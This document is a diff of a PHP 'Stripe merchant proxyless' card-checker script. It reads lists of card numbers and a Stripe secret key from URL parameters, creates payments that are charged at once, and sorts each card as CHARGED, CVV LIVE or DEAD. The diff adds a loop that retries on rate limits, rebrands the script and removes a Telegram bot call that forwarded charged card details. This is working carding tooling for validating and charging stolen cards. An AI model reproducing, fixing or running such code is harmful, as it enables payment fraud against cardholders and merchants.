@@ -1,7 +1,7 @@
 <?php
 
 
-//===================== [ MADE BY Tx-Code ] ====================//
+//===================== [ MADE BY checker ] ====================//
 #---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
 
 
@@ -28,17 +28,12 @@ function multiexplode($seperator, $string){
     return $two;
     };
 
-if(isset($_GET['cst'])){
-
-$amt = $_GET['cst'];
-}
-if(empty($amt)) {
-    $amt = '1';
-}
-    $chr = $amt * 100;
-
 $idd = $_GET['idd'];
-
+$amt = $_GET['cst'];
+if(empty($amt)) {
+	$amt = '1';
+	$chr = $amt * 100;
+}
 $sk = $_GET['sec'];
 $lista = $_GET['lista'];
     $cc = multiexplode(array(":", "|", ""), $lista)[0];
@@ -55,55 +50,111 @@ if (strlen($ano) == 2) $ano = "20$ano";
 
 //================= [ CURL REQUESTS ] =================//
 
-#-------------------[1st REQ]--------------------#  
-  
+#-------------------[1st REQ]--------------------#
+$x = 0;  
+
+while(true)  
+
+{  
+
 $ch = curl_init();  
+
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
+
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
+
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
+
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
+
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.''); 
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');  
+
 $result1 = curl_exec($ch);  
+
 $tok1 = Getstr($result1,'"id": "','"');  
+
 $msg = Getstr($result1,'"message": "','"');  
+
 //echo "<br><b>Result1: </b> $result1<br>";  
 
-  
-#------------------[2nd REQ]--------------------#  
+if (strpos($result1, "rate_limit"))   
+
+{  
+
+    $x++;  
+
+    continue;  
+
+}  
+
+break;  
+
+}
+//echo "<br><b>Result1: </b> $result1<br>";
+
+#-------------------[2nd REQ]--------------------#
+
+$x = 0;  
+
+while(true)  
+
+{  
 
 $ch = curl_init();  
+
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
+
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
+
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
+
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
+
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Tx-Code Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=eur&payment_method_types[]=card&description=SYNZX Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+
 $result2 = curl_exec($ch);  
+
 $tok2 = Getstr($result2,'"id": "','"');  
+
 $receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
+
 //echo "<br><b>Result2: </b> $result2<br>";  
+
+if (strpos($result2, "rate_limit"))   
+
+{  
+
+    $x++;  
+
+    continue;  
+
+}  
+
+break;  
+
+}
+
+
 
 
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
-$tg2 = 
-" CHARGED: <code>".$lista."</code>
-𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀: $ ".$amt." 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 𝘾𝙑𝙑 ";
-
-$apiToken = '';
-$forward1 = ['chat_id' => '','text' => $tg2,'parse_mode' => 'HTML' ];
-$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
-
-
-
+   
+    
+   
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: €'.$amt.' 𝗖𝗩𝗩 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 𝗕𝗬 𝗦𝗬𝗡𝗭𝗫  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝗖𝗩𝗩 𝗟𝗜𝗩𝗘</span><br>';
 }
 
 
@@ -114,16 +165,16 @@ elseif(strpos($result2, "generic_decline" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
 }
 elseif(strpos($result2, "insufficient_funds" )) {
-    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝙄𝙉𝙎𝙐𝙁𝙁𝙄𝘾𝙄𝙀𝙉𝙏 𝙁𝙐𝙉𝘿𝙎</span><br>';
 }
 
 elseif(strpos($result2, "fraudulent" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 }
-elseif(strpos($resultl3, "do_not_honor" )) {
+elseif(strpos($resul3, "do_not_honor" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
     }
-elseif(strpos($resultl2, "do_not_honor" )) {
+elseif(strpos($resul2, "do_not_honor" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result,"fraudulent")){
@@ -132,10 +183,10 @@ elseif(strpos($result,"fraudulent")){
 }
 
 elseif(strpos($result2,'"code": "incorrect_cvc"')){
-    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo '𝘾𝘾𝙉</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
-    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo '𝘾𝘾𝙉</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
      
 }
 elseif(strpos($result1,"invalid_expiry_month")){
@@ -154,7 +205,7 @@ elseif(strpos($result2, "lost_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
 }
 elseif(strpos($result2, "lost_card" )) {
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY ITSSWAGGER</span> <br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY checker</span> <br>';
 }
 
 elseif(strpos($result2, "stolen_card" )) {
@@ -182,7 +233,7 @@ elseif(strpos($result2, "transaction_not_allowed" )) {
     	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
    } 
 elseif(strpos($result2, "incorrect_cvc" )) {
-    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo '𝘾𝘾𝙉</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result2, "pickup_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
@@ -275,7 +326,7 @@ elseif (strpos($result,'Your card does not support this type of purchase.')) {
     }
 
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+    echo 'CVV</span>  </span>:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
 }
 elseif(strpos($result2, "fraudulent" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
@@ -295,14 +346,13 @@ elseif(strpos($result1, "card_not_supported" )) {
 else {
     echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
    
-         
+   
+      
 }
 
-echo " BYPASSING: $x <br>";
 
 
 
-//===================== [ MADE BY Tx-Code ] ====================//
 
 
 //echo "<br><b>Lista:</b> $lista<br>";
@@ -311,7 +361,9 @@ echo " BYPASSING: $x <br>";
 //echo "<b>Reason:</b> $reason<br>";
 //echo "<b>Risk Level:</b> $riskl<br>";
 //echo "<b>Seller Message:</b> $seller_msg<br>";
+echo " BYPASSING: $x <br>";
 
+//echo "<br><b>Result3: </b> $result2<br>";
 
 curl_close($ch);
 ob_flush();
